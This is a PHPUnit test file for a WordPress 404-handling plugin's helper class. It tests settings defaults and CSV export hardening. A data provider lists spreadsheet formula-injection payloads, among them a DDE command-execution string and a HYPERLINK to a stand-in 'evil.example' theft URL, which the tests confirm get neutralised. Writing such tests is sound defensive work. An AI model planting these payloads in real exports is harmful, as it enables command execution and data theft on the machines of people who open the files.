<?php
/**
 * Unit tests for the Helpers class.
 *
 * @package Custom_404_Pro
 */

use PHPUnit\Framework\TestCase;

/**
 * Helpers test case.
 */
class HelpersTest extends TestCase {

	/**
	 * Resets the test options store before each test.
	 */
	protected function setUp(): void {
		parent::setUp();
		$GLOBALS['_test_options'] = array();
	}

	// ------------------------------------------------------------------
	// Property declarations (PHP 8.2+ dynamic property deprecation guard)
	// ------------------------------------------------------------------

	/**
	 * Asserts that table_logs is an explicitly declared property.
	 */
	public function test_table_logs_is_declared_property() {
		$ref = new ReflectionClass( Helpers::class );
		$this->assertTrue(
			$ref->hasProperty( 'table_logs' ),
			'table_logs must be explicitly declared to avoid PHP 8.2+ deprecation'
		);
	}

	/**
	 * Asserts that table_logs has the expected value after construction.
	 */
	public function test_table_logs_has_correct_value_after_construction() {
		$helpers = new Helpers();
		$this->assertSame( 'custom_404_pro_logs', $helpers->table_logs );
	}

	// ------------------------------------------------------------------
	// defaults()
	// ------------------------------------------------------------------

	/**
	 * Asserts that defaults() returns an array.
	 */
	public function test_defaults_returns_array() {
		$helpers = new Helpers();
		$this->assertIsArray( $helpers->defaults() );
	}

	/**
	 * Asserts that defaults() contains all required setting keys.
	 */
	public function test_defaults_contains_all_required_keys() {
		$helpers  = new Helpers();
		$required = array( 'mode', 'mode_page', 'mode_url', 'send_email', 'logging_enabled', 'redirect_error_code', 'log_ip', 'email_cooldown', 'log_retention_count', 'log_retention_days' );
		foreach ( $required as $key ) {
			$this->assertArrayHasKey( $key, $helpers->defaults(), "defaults() should contain key '{$key}'." );
		}
	}

	/**
	 * Asserts that log_retention_count defaults to 0 (disabled).
	 */
	public function test_defaults_log_retention_count_is_zero() {
		$helpers = new Helpers();
		$this->assertSame( 0, $helpers->defaults()['log_retention_count'] );
	}

	/**
	 * Asserts that log_retention_days defaults to 0 (disabled).
	 */
	public function test_defaults_log_retention_days_is_zero() {
		$helpers = new Helpers();
		$this->assertSame( 0, $helpers->defaults()['log_retention_days'] );
	}

	/**
	 * Asserts that redirect_error_code defaults to 302.
	 */
	public function test_defaults_redirect_error_code_is_302() {
		$helpers = new Helpers();
		$this->assertSame( 302, $helpers->defaults()['redirect_error_code'] );
	}

	/**
	 * Asserts that log_ip defaults to true.
	 */
	public function test_defaults_log_ip_is_true() {
		$helpers = new Helpers();
		$this->assertTrue( $helpers->defaults()['log_ip'] );
	}

	// ------------------------------------------------------------------
	// get_settings()
	// ------------------------------------------------------------------

	/**
	 * Asserts that get_settings() returns the defaults when no option is stored.
	 */
	public function test_get_settings_returns_defaults_when_no_option_stored() {
		$helpers = new Helpers();
		$this->assertSame( $helpers->defaults(), $helpers->get_settings() );
	}

	/**
	 * Asserts that get_settings() returns stored values merged over defaults.
	 */
	public function test_get_settings_returns_stored_values() {
		update_option( Helpers::OPTION_KEY, array( 'mode' => 'url', 'mode_url' => 'https://example.com' ) );
		$helpers   = new Helpers();
		$settings  = $helpers->get_settings();
		$this->assertSame( 'url', $settings['mode'] );
		$this->assertSame( 'https://example.com', $settings['mode_url'] );
	}

	/**
	 * Asserts that get_settings() fills in missing keys from defaults.
	 */
	public function test_get_settings_fills_missing_keys_from_defaults() {
		update_option( Helpers::OPTION_KEY, array( 'mode' => 'url' ) );
		$helpers  = new Helpers();
		$settings = $helpers->get_settings();
		$this->assertSame( 302, $settings['redirect_error_code'] );
		$this->assertTrue( $settings['log_ip'] );
	}

	// ------------------------------------------------------------------
	// get_setting()
	// ------------------------------------------------------------------

	/**
	 * Asserts that get_setting() returns the value for a stored key.
	 */
	public function test_get_setting_returns_stored_value() {
		update_option( Helpers::OPTION_KEY, array( 'mode' => 'page' ) );
		$helpers = new Helpers();
		$this->assertSame( 'page', $helpers->get_setting( 'mode' ) );
	}

	/**
	 * Asserts that get_setting() returns the default when the key is not in the stored option.
	 */
	public function test_get_setting_returns_default_for_missing_key() {
		update_option( Helpers::OPTION_KEY, array() );
		$helpers = new Helpers();
		$this->assertSame( 302, $helpers->get_setting( 'redirect_error_code' ) );
	}

	/**
	 * Asserts that get_setting() returns null for an unknown key.
	 */
	public function test_get_setting_returns_null_for_unknown_key() {
		$helpers = new Helpers();
		$this->assertNull( $helpers->get_setting( 'nonexistent_key' ) );
	}

	// ------------------------------------------------------------------
	// update_settings()
	// ------------------------------------------------------------------

	/**
	 * Asserts that update_settings() persists the supplied values.
	 */
	public function test_update_settings_persists_values() {
		$helpers = new Helpers();
		$helpers->update_settings( array( 'mode' => 'url', 'mode_url' => 'https://example.com' ) );
		$this->assertSame( 'url', $helpers->get_setting( 'mode' ) );
		$this->assertSame( 'https://example.com', $helpers->get_setting( 'mode_url' ) );
	}

	/**
	 * Asserts that update_settings() merges with existing values rather than replacing them.
	 */
	public function test_update_settings_merges_with_existing_values() {
		$helpers = new Helpers();
		$helpers->update_settings( array( 'mode' => 'url' ) );
		$helpers->update_settings( array( 'mode_url' => 'https://example.com' ) );
		// Both keys should be present.
		$this->assertSame( 'url', $helpers->get_setting( 'mode' ) );
		$this->assertSame( 'https://example.com', $helpers->get_setting( 'mode_url' ) );
	}

	/**
	 * Asserts that update_settings() does not overwrite keys not included in the update.
	 */
	public function test_update_settings_preserves_untouched_keys() {
		$helpers = new Helpers();
		$helpers->update_settings( array( 'redirect_error_code' => 301 ) );
		$helpers->update_settings( array( 'mode' => 'url' ) );
		// redirect_error_code should still be 301.
		$this->assertSame( 301, $helpers->get_setting( 'redirect_error_code' ) );
	}

	/**
	 * Asserts that update_settings() returns true on success.
	 */
	public function test_update_settings_returns_true() {
		$helpers = new Helpers();
		$this->assertTrue( $helpers->update_settings( array( 'mode' => '' ) ) );
	}

	// ------------------------------------------------------------------
	// CSV export escaping (formula injection)
	// ------------------------------------------------------------------

	/**
	 * A plain value should pass through the CSV escaper untouched.
	 */
	public function test_escape_csv_value_leaves_plain_values_unchanged() {
		$helpers = new Helpers();
		$this->assertSame( '/some/missing/page', $helpers->escape_csv_value( '/some/missing/page' ) );
		$this->assertSame( 'Mozilla/5.0 (X11; Linux x86_64)', $helpers->escape_csv_value( 'Mozilla/5.0 (X11; Linux x86_64)' ) );
	}

	/**
	 * An empty value should stay empty rather than gain a prefix.
	 */
	public function test_escape_csv_value_leaves_empty_string_unchanged() {
		$helpers = new Helpers();
		$this->assertSame( '', $helpers->escape_csv_value( '' ) );
	}

	/**
	 * Values a spreadsheet would evaluate as a formula must be prefixed so they
	 * are rendered as literal text instead. The referer and user agent columns
	 * are attacker-controlled, so these reach the export from the outside world.
	 *
	 * @dataProvider csv_formula_provider
	 * @param string $dangerous Value that a spreadsheet would evaluate.
	 */
	public function test_escape_csv_value_neutralizes_formula_payloads( string $dangerous ) {
		$helpers = new Helpers();
		$escaped = $helpers->escape_csv_value( $dangerous );

		$this->assertSame( "'" . $dangerous, $escaped, 'Formula payloads must be prefixed with an apostrophe.' );
		$this->assertNotSame( $dangerous, $escaped );
		$this->assertStringStartsWith( "'", $escaped );
	}

	/**
	 * Supplies representative CSV injection payloads.
	 *
	 * @return array<string, array<string>>
	 */
	public function csv_formula_provider(): array {
		return array(
			'equals command'   => array( "=cmd|' /C calc'!A0" ),
			'equals hyperlink' => array( '=HYPERLINK("https://evil.example/steal","click")' ),
			'plus prefix'      => array( '+1+1' ),
			'minus prefix'     => array( '-1+1' ),
			'at prefix'        => array( '@SUM(1+1)' ),
			'tab prefix'       => array( "\t=1+1" ),
			'carriage return'  => array( "\r=1+1" ),
		);
	}

	/**
	 * Non-string scalars should be cast rather than trigger a type error.
	 */
	public function test_escape_csv_value_casts_non_string_input() {
		$helpers = new Helpers();
		$this->assertSame( '42', $helpers->escape_csv_value( 42 ) );
		$this->assertSame( '', $helpers->escape_csv_value( null ) );
	}

	// ------------------------------------------------------------------
	// CSV row writing
	// ------------------------------------------------------------------

	/**
	 * Writing a CSV row must not raise a deprecation on PHP 8.4+.
	 *
	 * PHP 8.4 deprecates calling fputcsv() without an explicit $escape. On a
	 * site with WP_DEBUG display enabled the notice would be written straight
	 * into the download stream and corrupt the exported file, so this promotes
	 * any deprecation to a failure.
	 */
	public function test_write_csv_row_raises_no_deprecation() {
		$raised  = array();
		$previous = set_error_handler(
			function ( $errno, $errstr ) use ( &$raised ) {
				$raised[] = $errstr;
				return true;
			},
			E_ALL
		);

		$helpers = new Helpers();
		$handle  = fopen( 'php://memory', 'w+' );
		$helpers->write_csv_row( $handle, array( 'a', 'b' ) );
		fclose( $handle );

		set_error_handler( $previous );

		$this->assertSame( array(), $raised, 'Writing a CSV row must not raise any notice or deprecation.' );
	}

	/**
	 * Quotes are escaped by doubling, per RFC 4180, not with a backslash.
	 */
	public function test_write_csv_row_uses_rfc4180_quoting() {
		$helpers = new Helpers();
		$handle  = fopen( 'php://memory', 'w+' );
		$helpers->write_csv_row( $handle, array( 'say "hi"', 'a,b', "line\nbreak" ) );
		rewind( $handle );
		$written = stream_get_contents( $handle );
		fclose( $handle );

		$this->assertStringContainsString( '"say ""hi"""', $written, 'Quotes must be doubled, not backslash-escaped.' );
		$this->assertStringContainsString( '"a,b"', $written, 'Values containing a comma must be quoted.' );
	}

	/**
	 * A backslash in a log value must survive the export unchanged.
	 *
	 * User agents contain backslashes. The historical fputcsv() default would
	 * consume them as escape characters.
	 */
	public function test_write_csv_row_preserves_backslashes() {
		$helpers = new Helpers();
		$handle  = fopen( 'php://memory', 'w+' );
		$helpers->write_csv_row( $handle, array( 'C:\\Windows\\System32' ) );
		rewind( $handle );
		$written = stream_get_contents( $handle );
		fclose( $handle );

		$this->assertStringContainsString( 'C:\\Windows\\System32', $written );
	}

	/**
	 * A formula payload must still be neutralised once written through the writer.
	 */
	public function test_escaped_formula_survives_csv_writing_as_text() {
		$helpers = new Helpers();
		$handle  = fopen( 'php://memory', 'w+' );
		$helpers->write_csv_row( $handle, array( $helpers->escape_csv_value( '=1+1' ) ) );
		rewind( $handle );
		$written = stream_get_contents( $handle );
		fclose( $handle );

		$this->assertStringStartsWith( "'=1+1", $written, 'The written cell must keep the neutralising prefix.' );
	}
}
